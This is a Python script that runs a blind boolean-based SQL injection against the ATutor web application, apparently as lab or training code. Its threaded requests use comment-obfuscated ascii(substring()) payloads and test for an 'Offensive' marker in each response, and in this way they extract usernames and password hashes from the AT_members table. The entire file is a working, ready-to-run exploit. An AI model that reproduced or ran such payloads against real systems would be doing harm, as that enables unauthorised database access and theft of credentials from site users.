import requests
import sys
import re
from bs4 import BeautifulSoup
import time
import concurrent.futures
from functools import partial
"""
#Parse response based on content length
def send_sqli_request(ip, inj_str, j):

    target = "http://%s/path?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
    r = requests.get(target)
    #print r.headers
    content_length = int(r.headers['Content-Length'])
    if (content_length > 20):
        return chr(j)
    return ""    
"""

def send_sqli_request(ip, inj_str, j):

    target = "http://%s/ATutor/path=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    error = re.search("Offensive", s.text)
    if error:
        return chr(j)
    return ""    

def inject(r, inj, ip):
    extracted = ""
    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)

        #multi: retrieved_value = send_sqli_request(ip,  injection_string)
        with concurrent.futures.ThreadPoolExecutor(max_workers=94) as executor: 
                threads = executor.map(partial(send_sqli_request, ip, injection_string), list(range(32, 126)))
        retrieved_value = ""

        for extracted_char in threads:  # map method puts inject() results in a sequential order
                retrieved_value += extracted_char # into the threads list 
        
        if(retrieved_value):
            extracted += retrieved_value
            #extracted_char = chr(retrieved_value)
            #sys.stdout.write(extracted_char)
            sys.stdout.write(retrieved_value)
            sys.stdout.flush()
        else:
            print ("\n(+) done!")
            break
    return extracted

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>")  % sys.argv[0]
        print ('(+) eg: %s 192.168.121.103')  % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]

    print ("(+) Retrieving username....")
    query = "select/**/login/**/from/**/AT_members"
    username = inject(50, query, ip)
    print(str(username))
    
    print ("(+) Retrieving password hash....")
    query = ("select/**/password/**/from/**/AT_members")
    password = inject(50, query, ip)
    #print ("(+) Credentials: %s / %s") % (username, password)


if __name__ == "__main__":
    main()